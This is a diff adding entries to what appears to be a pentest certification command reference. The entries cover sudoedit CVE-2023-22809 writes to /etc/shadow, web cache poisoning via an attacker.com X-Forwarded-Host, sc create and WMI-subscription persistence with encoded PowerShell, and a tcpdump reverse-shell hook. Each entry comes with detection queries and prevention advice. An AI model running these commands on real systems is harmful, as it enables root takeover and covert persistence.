+        "artifacts": "Reverse-proxy/app access logs with millisecond timestamps showing clustered identical POSTs, application logs showing the same coupon/transaction id applied multiple times, and WAF rate counters.",
+        "splunk_spl": "index=web uri_path=\"/redeem\" method=POST\n| bin _time span=1s\n| stats count by _time, clientip, uri_path\n| where count>3",
+        "elastic_kql": "url.path:\"/redeem\" and http.request.method:\"POST\"",
+        "sentinel_kql": "W3CIISLog\n| where csUriStem == \"/redeem\" and csMethod == \"POST\"\n| summarize reqs=count() by cIP, bin(TimeGenerated, 1s)\n| where reqs > 3",
+        "sigma_rules": "web_single_packet_race_burst",
+        "prevention": "Make state changes atomic: database uniqueness constraints, SELECT ... FOR UPDATE / row locks, or idempotency keys per operation. Serialize per-resource critical sections. Do not rely on an initial read-check; enforce the invariant at commit time. Treat rate limits as best-effort, not security.",
+        "sources": [
+          "https://portswigger.net/web-security/race-conditions",
+          "https://portswigger.net/research/smashing-the-state-machine"
+        ],
+        "detections": [
+          {
+            "platform": "splunk",
+            "name": "Burst of identical state-changing POSTs within 1 second",
+            "logic": "index=web method=POST (uri_path=\"/redeem\" OR uri_path=\"/transfer\" OR uri_path=\"/apply-coupon\")\n| bin _time span=1s\n| stats count as reqs by _time, clientip, uri_path\n| where reqs>3",
+            "data_source": "iis",
+            "attack": [
+              "T1190"
+            ],
+            "fidelity": "behavioral",
+            "confidence": "medium",
+            "false_positives": "Legitimate client retries, double-click submits, and mobile apps that batch requests.",
+            "tuning": "Scope to endpoints that must be idempotent/one-time; correlate with repeated use of the same coupon/transaction id in app logs."
+          }
+        ]
+      }
     },
     {
       "id": "crtp-skeleton-key",
@@ -166565,6 +171770,111 @@ const COMMAND_DATA = {
       "explain": "Abuses tcpdump's post-rotate command hook to run a script as root:\n  sudo tcpdump -ln -i eth0   capture on the interface\n  -w /dev/null -W 1 -G 1   rotate the capture file every 1 second, keeping 1 file\n  -z /tmp/.test            run this script on each rotated file (executed as root)\n  -Z root                  drop privileges to root (so -z runs as root)\nPoint -z at a reverse-shell script and catch the root shell on your listener."
     },
     {
+      "id": "linux-sudoedit-cve-2023-22809",
+      "name": "sudoedit EDITOR extra-args arbitrary file write (CVE-2023-22809)",
+      "command": "EDITOR='vim -- /etc/shadow' sudoedit <allowed_file>",
+      "description": "CVE-2023-22809 is a flaw in sudo's sudoedit (sudo -e): the user-controlled EDITOR / VISUAL / SUDO_EDITOR variable is parsed so that an extra '--' plus an additional path is appended to the file list sudoedit opens as root. If sudoers grants the user sudoedit on any file, they can smuggle an arbitrary target (e.g. /etc/shadow, /etc/sudoers) into that privileged edit and write to it as root. Affects sudo 1.8.0 through 1.9.12p1.",
+      "platform": "linux",
+      "type": "command",
+      "opsec": "quiet",
+      "category": "Privilege Escalation",
+      "subcategory": "Linux - Sudo Abuse",
+      "certifications": [
+        "OSCP"
+      ],
+      "primary_cert": "OSCP",
+      "source": "Synacktiv / CVE-2023-22809",
+      "tags": [
+        "cve-2023-22809",
+        "sudoedit",
+        "sudo",
+        "arbitrary-write",
+        "privesc"
+      ],
+      "mitre": [
+        "T1068",
+        "T1548.003"
+      ],
+      "exam": "exam-ok",
+      "notes": "=== WHAT IT IS ===\n  sudoedit builds the list of files to edit from argv AND from the user's EDITOR variable.\n  A '--' in EDITOR terminates option parsing, and anything after it is treated as an\n  extra file to open with root privileges - even a file the sudoers rule never allowed.\n\n=== CHECK VULN ===\n  sudo --version        # vulnerable: 1.8.0 .. 1.9.12p1\n  sudo -l               # need a line granting sudoedit / 'sudo -e' on some file\n  # e.g.  (root) sudoedit /etc/httpd/conf/httpd.conf\n\n=== EXPLOIT ===\n  export EDITOR='vi -- /etc/shadow'          # or VISUAL / SUDO_EDITOR\n  sudoedit /etc/httpd/conf/httpd.conf        # the file sudoers DOES allow\n  # sudoedit opens BOTH files as root; edit /etc/shadow -> set a known root hash\n  # or EDITOR='vi -- /etc/sudoers' to add yourself NOPASSWD ALL\n\n=== TURN WRITE INTO ROOT ===\n  # /etc/passwd: add a root-uid user with a known password hash (openssl passwd -1)\n  # /etc/sudoers: '<user> ALL=(ALL) NOPASSWD: ALL'\n  # /etc/shadow: replace root's hash\n\n=== ALTERNATIVES ===\n  GTFOBins sudoedit/sudo entries; other sudo CVEs (2019-14287, 2021-3156 baron samedit)",
+      "examples": [
+        {
+          "label": "Confirm sudo version and a sudoedit grant",
+          "command": "sudo --version; sudo -l"
+        },
+        {
+          "label": "Smuggle /etc/shadow into an allowed sudoedit",
+          "command": "EDITOR='vi -- /etc/shadow' sudoedit /etc/httpd/conf/httpd.conf"
+        },
+        {
+          "label": "Or add a NOPASSWD rule via /etc/sudoers",
+          "command": "EDITOR='vi -- /etc/sudoers' sudoedit /etc/httpd/conf/httpd.conf"
+        }
+      ],
+      "references": [
+        {
+          "title": "NVD - CVE-2023-22809",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-22809"
+        },
+        {
+          "title": "Synacktiv advisory",
+          "url": "https://www.synacktiv.com/sites/default/files/2023-01/sudo-CVE-2023-22809.pdf"
+        },
+        {
+          "title": "Sudo security advisory",
+          "url": "https://www.sudo.ws/security/advisories/sudoedit_any/"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "sudo-abuse",
+          "note": "General sudo/sudoers abuse this CVE extends.",
+          "rel": "prereq"
+        },
+        {
+          "id": "find-suid-sgid",
+          "note": "Enumerate other local-privilege vectors alongside sudo -l.",
+          "rel": "alternative"
+        },
+        {
+          "id": "linux-looney-tunables",
+          "note": "glibc local root when no sudoedit grant exists.",
+          "rel": "alternative"
+        }
+      ],
+      "defense": {
+        "why_it_works": "sudoedit parses the editor command from the user-controlled EDITOR/VISUAL/SUDO_EDITOR variable and concatenates any post-'--' tokens onto the list of files it opens with root privileges, without re-checking them against the sudoers policy. The policy only authorizes the originally allowed file, so the attacker-appended path is opened as root unchecked.",
+        "prerequisites": "A sudoers rule granting the user sudoedit (sudo -e) on at least one file, and vulnerable sudo 1.8.0-1.9.12p1. The user sets EDITOR/VISUAL/SUDO_EDITOR.",
+        "impact": "Arbitrary file write as root (edit /etc/shadow, /etc/passwd, or /etc/sudoers), leading directly to full root. Requires only a narrow, commonly-granted sudoedit permission.",
+        "detection": "[MITRE T1548.003] sudoedit invocations where the EDITOR/VISUAL/SUDO_EDITOR environment contains '--' followed by a path; sudo logs showing a sudoedit of an allowed file immediately followed by changes to /etc/shadow, /etc/passwd or /etc/sudoers; auditd writes to those files by a root-owned editor process spawned from sudoedit.",
+        "artifacts": "sudo I/O logs / journald entries for the sudoedit command; auditd execve capturing EDITOR with '--'; modification timestamps on /etc/shadow, /etc/passwd, /etc/sudoers; the editor process parented by sudoedit touching an unexpected file.",
+        "splunk_spl": "index=linux (sourcetype=\"linux:auditd\" OR sourcetype=syslog)\n| search (proctitle=\"*sudoedit*\" OR exe=\"*sudoedit*\") (a1=\"*--*\" OR proctitle=\"*EDITOR*--*\" OR proctitle=\"*SUDO_EDITOR*--*\")\n| table _time, host, auid, exe, proctitle",
+        "elastic_kql": "process.name:sudoedit and process.env_vars:(*EDITOR* and *\\-\\-*)",
+        "sentinel_kql": "Syslog\n| where SyslogMessage has \"sudoedit\" and SyslogMessage has \"--\" and SyslogMessage has_any (\"EDITOR\",\"VISUAL\",\"SUDO_EDITOR\")\n| project TimeGenerated, Computer, SyslogMessage\n| sort by TimeGenerated desc\n// sudoedit opening an extra post-'--' file as root (CVE-2023-22809)",
+        "sigma_rules": "lnx_sudoedit_editor_extra_args (EDITOR/SUDO_EDITOR containing -- plus an extra path in a sudoedit call)",
+        "prevention": "Patch sudo to 1.9.12p2 or later. Avoid granting sudoedit/sudo -e where possible; if required, scope it tightly and monitor. Some mitigation via an env-reset sudoers policy that strips EDITOR/VISUAL/SUDO_EDITOR, though upgrading is the real fix.",
+        "sources": [
+          "https://nvd.nist.gov/vuln/detail/CVE-2023-22809",
+          "https://www.sudo.ws/security/advisories/sudoedit_any/"
+        ],
+        "detections": [
+          {
+            "platform": "sentinel",
+            "name": "sudoedit extra-args file write (CVE-2023-22809)",
+            "logic": "Syslog\n| where SyslogMessage has \"sudoedit\"\n| where SyslogMessage has_any (\"EDITOR\",\"VISUAL\",\"SUDO_EDITOR\")\n| where SyslogMessage has \"--\"\n| project TimeGenerated, Computer, SyslogMessage",
+            "data_source": "linux-audit",
+            "attack": [
+              "T1548.003"
+            ],
+            "fidelity": "behavioral",
+            "confidence": "high",
+            "false_positives": "Legitimate editors rarely need a '--' separator passed through EDITOR to sudoedit.",
+            "tuning": "Correlate a sudoedit call with a subsequent modification of /etc/shadow, /etc/passwd or /etc/sudoers within seconds."
+          }
+        ]
+      }
+    },
+    {
       "type": "command",
       "platform": "linux",
       "requires": [
@@ -179438,6 +184748,112 @@ const COMMAND_DATA = {
       }
     },
     {
+      "id": "web-cache-poisoning",
+      "name": "Web Cache Poisoning (Unkeyed Input)",
+      "command": "GET / HTTP/1.1\\nHost: <target>\\nX-Forwarded-Host: attacker.com",
+      "description": "Poisons a shared web cache by getting a harmful response stored against a normal cache key. The attack targets unkeyed inputs - request components the cache ignores for keying but the origin reflects into the response - most commonly X-Forwarded-Host, X-Forwarded-Scheme, X-Host, and other headers, plus unkeyed query params and fat GET bodies. Distinct from cache deception (which serves one user's private content to another). Uses Param Miner to discover unkeyed inputs.",
+      "platform": "multi",
+      "type": "command",
+      "opsec": "loud",
+      "category": "Web",
+      "subcategory": "Caching",
+      "certifications": [
+        "CWES"
+      ],
+      "primary_cert": "CWES",
+      "source": "PortSwigger Web Security Academy - Web cache poisoning",
+      "tags": [
+        "cache-poisoning",
+        "unkeyed-input",
+        "x-forwarded-host",
+        "param-miner",
+        "cdn"
+      ],
+      "mitre": [
+        "T1190",
+        "T1659"
+      ],
+      "exam": "exam-ok",
+      "notes": "=== WHY IT WORKS ===\n  A cache stores a response under a key (usually method + host + path + some query). Inputs NOT in the key are 'unkeyed'. If the origin reflects an unkeyed input into the response (e.g. builds an absolute URL from X-Forwarded-Host), you can poison the cached copy served to everyone hitting that key.\n\n=== METHOD ===\n  1. Find an unkeyed input that is reflected (Param Miner > 'Guess headers' / 'Guess params').\n  2. Confirm the response is cached (Age / X-Cache: hit / Cache-Control headers; identical response on repeat).\n  3. Inject a payload via the unkeyed input that reflects into the cached response.\n  4. Re-request the clean URL - the poisoned response is served from cache.\n\n=== CLASSIC UNKEYED HEADERS ===\n  X-Forwarded-Host, X-Host, X-Forwarded-Scheme, X-Forwarded-Server, X-Original-URL, X-Rewrite-URL, Forwarded.\n\n=== PAYLOAD CLASSES ===\n  - Reflected XSS into a cached page (steal many users' sessions).\n  - Cached redirect to attacker.com via X-Forwarded-Host in a Location/script src.\n  - Import malicious script by poisoning a reflected host in a <script src> base.\n  - DoS: poison with an oversized/invalid header to cache an error.\n\n=== CACHE-KEY TRICKS ===\n  - Cache-key normalization: path?utm=... may be unkeyed; find a param the origin uses but the cache ignores.\n  - 'Fat GET': a GET with a body that the origin parses but the cache does not key on.\n\n=== TOOLING ===\n  - Burp extension 'Param Miner' (Guess headers, Guess GET params, Bulk scan).\n  - Watch X-Cache, Age, CF-Cache-Status, Cache-Control, Vary in responses.",
+      "examples": [
+        {
+          "label": "Poison with X-Forwarded-Host to import attacker script",
+          "command": "curl -s https://<target>/ -H 'X-Forwarded-Host: attacker.com'"
+        },
+        {
+          "label": "Confirm caching via the Age / X-Cache headers",
+          "command": "curl -sI https://<target>/en/ | grep -iE 'age|x-cache|cf-cache|cache-control'"
+        },
+        {
+          "label": "Param Miner bulk header guess",
+          "command": "Burp > target > Extensions > Param Miner > 'Guess headers'"
+        }
+      ],
+      "references": [
+        {
+          "title": "PortSwigger - Web cache poisoning",
+          "url": "https://portswigger.net/web-security/web-cache-poisoning"
+        },
+        {
+          "title": "Practical Web Cache Poisoning (James Kettle)",
+          "url": "https://portswigger.net/research/practical-web-cache-poisoning"
+        },
+        {
+          "title": "Param Miner",
+          "url": "https://github.com/PortSwigger/param-miner"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "web-cache-deception",
+          "note": "Sibling cache class - deception serves private content rather than poisoning a shared key.",
+          "rel": "alternative"
+        },
+        {
+          "id": "web-host-header-injection",
+          "note": "Host-header reflection is a primary unkeyed input for poisoning.",
+          "rel": "prereq"
+        },
+        {
+          "id": "xss-detect",
+          "note": "Reflected XSS delivered via a poisoned cache magnifies impact across all users.",
+          "rel": "next"
+        }
+      ],
+      "defense": {
+        "why_it_works": "The cache keys on a subset of the request; any input the origin reflects but the cache omits from the key (unkeyed) lets an attacker store a harmful response that is then served to every user requesting the normal URL.",
+        "prerequisites": "A caching layer (CDN/reverse proxy) in front of an origin that reflects an unkeyed input into cacheable responses, and a cacheable resource.",
+        "impact": "Mass delivery of reflected XSS, malicious script imports, forced redirects, or denial of service to every user served the poisoned cache entry - a stored, wide-blast-radius attack.",
+        "detection": "[MITRE T1659] Requests carrying X-Forwarded-Host/X-Host/X-Forwarded-Scheme or other off-host header values, cache responses whose reflected host differs from the real host, and sudden changes in a cached resource's content hash.",
+        "artifacts": "CDN/reverse-proxy access logs showing anomalous forwarding headers, cache hit/miss and Age headers, and origin logs correlating reflected header values in response bodies.",
+        "splunk_spl": "index=web\n| rex field=_raw \"X-Forwarded-Host:\\s*(?<xfh>[^\\r\\n]+)\"\n| where isnotnull(xfh) AND xfh!=\"<target>\"\n| stats count by clientip, xfh, uri_path",
+        "elastic_kql": "http.request.headers.x-forwarded-host:* and not http.request.headers.x-forwarded-host:\"<target>\"",
+        "sentinel_kql": "AZFWApplicationRule\n| where RequestHeaders has \"X-Forwarded-Host\"\n| extend xfh = extract(@\"X-Forwarded-Host:\\s*([^\\r\\n;]+)\", 1, RequestHeaders)\n| where isnotempty(xfh) and xfh != \"<target>\"\n| summarize count() by SourceIp, xfh",
+        "sigma_rules": "web_cache_poisoning_unkeyed_host_header",
+        "prevention": "Add every input the origin reflects to the cache key (or stop reflecting it). Strip untrusted X-Forwarded-* / Forwarded headers at the edge. Set explicit Vary headers, disable caching of responses that reflect request data, and never build absolute URLs or script sources from client-supplied host headers.",
+        "sources": [
+          "https://portswigger.net/web-security/web-cache-poisoning",
+          "https://portswigger.net/research/practical-web-cache-poisoning"
+        ],
+        "detections": [
+          {
+            "platform": "splunk",
+            "name": "Off-host X-Forwarded-Host header reaching a cacheable path",
+            "logic": "index=web sourcetype=nginx\n| rex field=_raw \"X-Forwarded-Host:\\s*(?<xfh>[^\\r\\n]+)\"\n| where isnotnull(xfh) AND NOT match(xfh, \"^<target>$\") AND like(status, \"2%\")\n| stats count by clientip, xfh, uri_path",
+            "data_source": "nginx",
+            "attack": [
+              "T1659",
+              "T1190"
+            ],
+            "fidelity": "behavioral",
+            "confidence": "medium",
+            "false_positives": "Legitimate multi-tier proxies that set X-Forwarded-Host to known internal hosts.",
+            "tuning": "Allow-list expected forwarding hosts set by your own edge; alert only on externally supplied values."
+          }
+        ]
+      }
+    },
+    {
       "type": "command",
       "platform": "linux",
       "requires": [
@@ -187368,6 +192784,136 @@ const COMMAND_DATA = {
       "explain": "PowerShell-native local user/group and software enumeration:\n  Get-LocalGroup           list local groups\n  | Select-Object Name, Description   show each group's name and purpose\nThe variations enumerate Administrators membership, installed software (from the Uninstall registry keys), running services and their run-as accounts, and hotfixes - richer, scriptable output than net.exe."
     },
     {
+      "id": "persist-service-creation",
+      "name": "Windows Service Persistence (sc create / binPath hijack)",
+      "command": "sc create <name> binPath= \"<payload>\" start= auto",
+      "description": "Creating a Windows service gives SYSTEM-level, reboot-surviving persistence: sc create or New-Service registers a service whose binPath is the payload and which auto-starts as LocalSystem. Alternatively, an existing service's ImagePath/binPath is hijacked (sc config binpath=) to run attacker code. Service control events make this noisy but it remains a classic, reliable SYSTEM persistence and privilege path.",
+      "platform": "windows",
+      "type": "command",
+      "opsec": "loud",
+      "category": "Persistence",
+      "subcategory": "Persistence",
+      "certifications": [
+        "CRTP"
+      ],
+      "primary_cert": "CRTP",
+      "source": "MITRE ATT&CK T1543.003; Microsoft service documentation",
+      "tags": [
+        "persistence",
+        "service",
+        "sc-create",
+        "system",
+        "binpath",
+        "privilege"
+      ],
+      "mitre": [
+        "T1543.003",
+        "T1569.002"
+      ],
+      "exam": "exam-ok",
+      "notes": "=== CREATE A NEW SERVICE (admin; runs as SYSTEM) ===\n  sc create <name> binPath= \"C:\\Windows\\Temp\\payload.exe\" start= auto\n  sc description <name> \"Windows Update Helper\"\n  sc start <name>\n  # NOTE the required SPACE after each '=' in sc.exe syntax.\n\n  # PowerShell equivalent:\n  New-Service -Name <name> -BinaryPathName \"C:\\Windows\\Temp\\payload.exe\" -StartupType Automatic\n\n=== SERVICE BINPATH HIJACK (existing service) ===\n  sc config <name> binPath= \"C:\\Windows\\Temp\\payload.exe\"\n  sc config <name> start= auto\n  # abuses weak service ACLs; see weak-service-acl-binpath for the privesc angle.\n\n=== NON-EXE PAYLOADS ===\n  A service expects a service-control binary; a plain EXE/one-liner may run then exit (SCM timeout).\n  Use a service-aware wrapper (e.g. msfvenom exe-service) or cmd /c start for a non-service payload.\n\n=== ENUMERATE (hunt / verify) ===\n  sc query type= service state= all\n  Get-CimInstance Win32_Service | Where StartMode -eq 'Auto' | Select Name,PathName,StartName\n\n=== ALTERNATIVES ===\n  Scheduled task (also SYSTEM, quieter), Run keys (user), WMI subscription.",
+      "examples": [
+        {
+          "label": "Create an auto-start SYSTEM service",
+          "command": "sc create <name> binPath= \"<payload>\" start= auto"
+        },
+        {
+          "label": "Hijack an existing service binPath (weak ACL)",
+          "command": "sc config <name> binPath= \"<payload>\""
+        },
+        {
+          "label": "Hunt auto-start services with suspicious paths (defender)",
+          "command": "Get-CimInstance Win32_Service | Where PathName -match 'Temp|AppData|ProgramData' | Select Name,PathName,StartName"
+        }
+      ],
+      "references": [
+        {
+          "title": "MITRE ATT&CK T1543.003 - Create or Modify System Process: Windows Service",
+          "url": "https://attack.mitre.org/techniques/T1543/003/"
+        },
+        {
+          "title": "Microsoft - sc.exe create",
+          "url": "https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/sc-create"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "persist-registry-run-keys",
+          "note": "Run keys are a user-level persistence alternative.",
+          "rel": "alternative"
+        },
+        {
+          "id": "scheduled-tasks-enum",
+          "note": "Scheduled tasks give similar SYSTEM persistence more quietly.",
+          "rel": "alternative"
+        },
+        {
+          "id": "unquoted-service-path",
+          "note": "Unquoted service paths are a related service-based abuse.",
+          "rel": "next"
+        }
+      ],
+      "defense": {
+        "why_it_works": "The Service Control Manager runs registered services, by default as LocalSystem, at boot. Creating a service or repointing an existing service's binary is a documented administrative action, so an attacker with admin (or write access to a service's configuration) gains SYSTEM execution that persists across reboots.",
+        "prerequisites": "Local administrator to create a service or modify HKLM service config; or write access to a specific service's ACL for a targeted binPath hijack. The payload should be service-aware or wrapped.",
+        "impact": "T1543.003 Create or Modify System Process: Windows Service. Persistent SYSTEM-level code execution surviving reboot; a binPath hijack of an auto-start service also provides privilege escalation.",
+        "detection": "High-fidelity events exist: System log 7045 (new service installed) and 7040 (start type changed); Security 4697 (service installed, with auditing); Sysmon EID 13 on HKLM\\System\\CurrentControlSet\\Services\\*\\ImagePath. Alert on ImagePath in user-writable/temp paths, cmd/powershell binPaths, and services.exe spawning interpreters.",
+        "artifacts": "System EID 7045/7040; Security 4697; Sysmon EID 13 on ...\\Services\\<name>\\ImagePath; Security 4688 / Sysmon EID 1 with ParentImage services.exe; the service binary on disk.",
+        "splunk_spl": "index=wineventlog (EventCode=7045 OR EventCode=4697)\n| search (ImagePath=\"*\\\\Temp\\\\*\" OR ImagePath=\"*\\\\AppData\\\\*\" OR ImagePath=\"*powershell*\" OR ImagePath=\"*cmd.exe*\" OR Service_File_Name=\"*powershell*\")\n| table _time, Computer, Account_Name, Service_Name, ImagePath, Service_File_Name, Service_Start_Type",
+        "elastic_kql": "event.code:(\"7045\" or \"4697\") and winlog.event_data.ImagePath:(*\\\\Temp\\\\* or *\\\\AppData\\\\* or *powershell* or *cmd.exe*)",
+        "sentinel_kql": "DeviceEvents\n| where ActionType == \"ServiceInstalled\"\n| where AdditionalFields has_any (\"\\\\Temp\\\\\",\"\\\\AppData\\\\\",\"powershell\",\"cmd.exe\",\"-enc\")\n| project Timestamp, DeviceName, InitiatingProcessAccountName, AdditionalFields",
+        "sigma_rules": "win_system_susp_service_installation_7045",
+        "prevention": "Audit service creation (4697/7045) centrally and alert on new or modified services, especially with temp/user-path or interpreter binPaths; harden service ACLs so non-admins cannot reconfigure services (fix weak binPath permissions); restrict local admin; use WDAC/ASR so even a service cannot launch unsigned code; baseline the legitimate service inventory.",
+        "sources": [
+          "https://attack.mitre.org/techniques/T1543/003/",
+          "https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/sc-create"
+        ],
+        "detections": [
+          {
+            "platform": "splunk",
+            "name": "New service installed with suspicious ImagePath (7045)",
+            "logic": "index=wineventlog EventCode=7045 (ImagePath=\"*\\\\Temp\\\\*\" OR ImagePath=\"*\\\\AppData\\\\*\" OR ImagePath=\"*powershell*\" OR ImagePath=\"*cmd.exe*\" OR ImagePath=\"*\\\\ProgramData\\\\*\")\n| table _time, Computer, Service_Name, ImagePath, Service_Start_Type",
+            "data_source": "windows-system",
+            "attack": [
+              "T1543.003"
+            ],
+            "fidelity": "behavioral",
+            "confidence": "high",
+            "log_ids": [
+              "7045"
+            ],
+            "false_positives": "Some legitimate installers create services from temp during setup",
+            "tuning": "Allowlist known installer-created services; correlate with signed binaries"
+          },
+          {
+            "platform": "sentinel",
+            "name": "services.exe spawning a command interpreter",
+            "logic": "DeviceProcessEvents\n| where InitiatingProcessFileName =~ \"services.exe\"\n| where FileName in~ (\"cmd.exe\",\"powershell.exe\",\"wscript.exe\",\"cscript.exe\")\n| project Timestamp, DeviceName, FileName, ProcessCommandLine",
+            "data_source": "defender-endpoint",
+            "attack": [
+              "T1543.003",
+              "T1569.002"
+            ],
+            "fidelity": "behavioral",
+            "confidence": "high",
+            "false_positives": "Rare legitimate service wrappers that shell out",
+            "tuning": "Baseline legitimate service-launched interpreters"
+          }
+        ],
+        "visibility": {
+          "requires": [
+            "windows-system",
+            "windows-security"
+          ],
+          "better_with": [
+            "sysmon",
+            "edr",
+            "defender-endpoint"
+          ]
+        }
+      }
+    },
+    {
       "type": "command",
       "platform": "windows",
       "requires": [
@@ -188717,6 +194263,132 @@ const COMMAND_DATA = {
         }
       ],
       "explain": "A Wireshark display filter isolating FTP control and data channels:\n  ftp        the FTP command/response channel (USER, PASS, RETR, ...)\n  ||         logical OR\n  ftp-data   the separate channel carrying the actual file bytes\nShows both halves of an FTP session so you can reconstruct transferred files; the card also covers Follow TCP Stream, HTTP object export, and RDP decryption with an imported RSA key."
+    },
+    {
+      "id": "persist-wmi-event-subscription",
+      "name": "WMI Event Subscription Persistence",
+      "command": "Register __EventFilter + CommandLineEventConsumer + __FilterToConsumerBinding",
+      "description": "Permanent WMI event subscription persistence registers an __EventFilter (a WQL trigger, e.g. a time interval or process start), a CommandLineEventConsumer or ActiveScriptEventConsumer (the payload), and a __FilterToConsumerBinding that links them. The payload is executed by WmiPrvSE.exe (SYSTEM) whenever the filter fires, with no file on disk and no Run key - a fileless, stealthy autostart. Registered via PowerShell or mofcomp.",
+      "platform": "windows",
+      "type": "command",
+      "opsec": "quiet",
+      "category": "Persistence",
+      "subcategory": "Persistence",
+      "certifications": [
+        "CRTP"
+      ],
+      "primary_cert": "CRTP",
+      "source": "MITRE ATT&CK T1546.003; Microsoft WMI documentation; public WMI-persistence research",
+      "tags": [
+        "wmi",
+        "persistence",
+        "event-subscription",
+        "fileless",
+        "system",
+        "mofcomp"
+      ],
+      "mitre": [
+        "T1546.003",
+        "T1047"
+      ],
+      "exam": "exam-ok",
+      "notes": "=== THREE OBJECTS (root/subscription namespace) ===\n  __EventFilter               # WHEN: a WQL query that fires the subscription\n  CommandLineEventConsumer    # WHAT: command line to run (also ActiveScriptEventConsumer for VBScript/JScript)\n  __FilterToConsumerBinding   # LINK: ties the filter to the consumer\n\n=== POWERSHELL REGISTRATION (admin) ===\n  $Filter = Set-WmiInstance -Namespace root\\subscription -Class __EventFilter -Arguments @{\n    Name='Updater'; EventNamespace='root\\cimv2'; QueryLanguage='WQL';\n    Query=\"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'\" }\n  $Consumer = Set-WmiInstance -Namespace root\\subscription -Class CommandLineEventConsumer -Arguments @{\n    Name='Updater'; CommandLineTemplate='powershell -enc <b64>' }\n  Set-WmiInstance -Namespace root\\subscription -Class __FilterToConsumerBinding -Arguments @{ Filter=$Filter; Consumer=$Consumer }\n\n=== MOFCOMP ALTERNATIVE ===\n  mofcomp evil.mof          # compile a .mof defining the same three objects into the repository\n\n=== TRIGGERS COMMONLY USED ===\n  - time/interval (__IntervalTimerInstruction or WITHIN clause)\n  - logon / process start (Win32_LogonSession, __InstanceCreationEvent on Win32_Process)\n\n=== ALTERNATIVES ===\n  Run/RunOnce keys, scheduled tasks, services - all more visible than a WMI subscription.",
+      "examples": [
+        {
+          "label": "Enumerate existing subscriptions (hunt / cleanup)",
+          "command": "Get-WmiObject -Namespace root\\subscription -Class __FilterToConsumerBinding"
+        },
+        {
+          "label": "List consumers to spot a malicious one",
+          "command": "Get-WmiObject -Namespace root\\subscription -Class CommandLineEventConsumer"
+        },
+        {
+          "label": "Remove a malicious binding/filter/consumer",
+          "command": "Get-WmiObject -Namespace root\\subscription -Class __EventFilter -Filter \"Name='Updater'\" | Remove-WmiObject"
+        }
+      ],
+      "references": [
+        {
+          "title": "MITRE ATT&CK T1546.003 - WMI Event Subscription",
+          "url": "https://attack.mitre.org/techniques/T1546/003/"
+        },
+        {
+          "title": "Microsoft - Receiving a WMI Event",
+          "url": "https://learn.microsoft.com/en-us/windows/win32/wmisdk/receiving-a-wmi-event"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "scheduled-tasks-enum",
+          "note": "Scheduled tasks are a more visible persistence alternative.",
+          "rel": "alternative"
+        },
+        {
+          "id": "persist-com-hijacking",
+          "note": "COM hijacking is another fileless, registry-driven persistence option.",
+          "rel": "alternative"
+        },
+        {
+          "id": "startup-autoruns",
+          "note": "Autoruns enumerates WMI subscriptions and other autostart locations.",
+          "rel": "next"
+        }
+      ],
+      "defense": {
+        "why_it_works": "WMI permanent event subscriptions are a legitimate management feature. The three objects live in the CIM repository (not the filesystem or Run keys), and the payload is launched by the trusted WmiPrvSE.exe as SYSTEM, so the technique is fileless and bypasses autostart checks that only look at the usual locations.",
+        "prerequisites": "Local administrator (to write to root\\subscription). The payload command can reference an encoded script, so no separate file is strictly required.",
+        "impact": "T1546.003 Event Triggered Execution: WMI Event Subscription. Persistent, fileless SYSTEM-level code execution that survives reboots and is invisible to Run-key/startup-folder inspection.",
+        "detection": "Monitor the WMI-Activity operational log (Microsoft-Windows-WMI-Activity/Operational EID 5861) for permanent consumer creation, and Sysmon EID 19/20/21 (WmiFilter / WmiConsumer / WmiBinding registration). Alert on CommandLineEventConsumer/ActiveScriptEventConsumer referencing powershell, encoded commands, or scripting engines, and on WmiPrvSE.exe spawning shells.",
+        "artifacts": "Sysmon EID 19 (__EventFilter), EID 20 (consumer), EID 21 (binding); Microsoft-Windows-WMI-Activity/Operational 5861; WmiPrvSE.exe child processes in Security 4688; the compiled objects in the OBJECTS.DATA repository.",
+        "splunk_spl": "index=sysmon (EventCode=19 OR EventCode=20 OR EventCode=21)\n| table _time, Computer, EventCode, Operation, User, Name, Query, Destination, Consumer\n| search Consumer=\"*powershell*\" OR Destination=\"*powershell*\" OR Query=\"*__InstanceCreationEvent*\"",
+        "elastic_kql": "event.code:(\"19\" or \"20\" or \"21\") and (winlog.event_data.Destination:*powershell* or winlog.event_data.Consumer:*CommandLineEventConsumer*)",
+        "sentinel_kql": "DeviceEvents\n| where ActionType == \"WmiBindingRegistration\" or ActionType == \"WmiConsumerRegistration\"\n| where AdditionalFields has_any (\"powershell\",\"-enc\",\"scrcons\",\"ActiveScript\")\n| project Timestamp, DeviceName, InitiatingProcessAccountName, ActionType, AdditionalFields",
+        "sigma_rules": "sysmon_wmi_persistence_commandline_consumer",
+        "prevention": "Baseline and alert on any new permanent WMI consumer (they are rare in most environments); restrict local admin so attackers cannot write to root\\subscription; enable Sysmon WMI eventing (config schema 4.1+) and the WMI-Activity operational log; periodically audit root\\subscription with Autoruns/Get-WmiObject and remove unknown bindings.",
+        "sources": [
+          "https://attack.mitre.org/techniques/T1546/003/",
+          "https://learn.microsoft.com/en-us/windows/win32/wmisdk/receiving-a-wmi-event"
+        ],
+        "detections": [
+          {
+            "platform": "splunk",
+            "name": "Permanent WMI consumer/binding registration with a script payload",
+            "logic": "index=sysmon (EventCode=20 OR EventCode=21) (Destination=\"*powershell*\" OR Destination=\"*-enc*\" OR Consumer=\"*ActiveScript*\")\n| table _time, Computer, EventCode, User, Name, Destination, Consumer",
+            "data_source": "sysmon",
+            "attack": [
+              "T1546.003"
+            ],
+            "fidelity": "behavioral",
+            "confidence": "high",
+            "false_positives": "A few monitoring/management products register permanent consumers",
+            "tuning": "Allowlist known management agents by consumer name"
+          },
+          {
+            "platform": "sentinel",
+            "name": "WmiPrvSE spawning a command interpreter",
+            "logic": "DeviceProcessEvents\n| where InitiatingProcessFileName =~ \"WmiPrvSE.exe\"\n| where FileName in~ (\"powershell.exe\",\"cmd.exe\",\"wscript.exe\",\"cscript.exe\",\"mshta.exe\")\n| project Timestamp, DeviceName, FileName, ProcessCommandLine",
+            "data_source": "defender-endpoint",
+            "attack": [
+              "T1546.003",
+              "T1047"
+            ],
+            "fidelity": "behavioral",
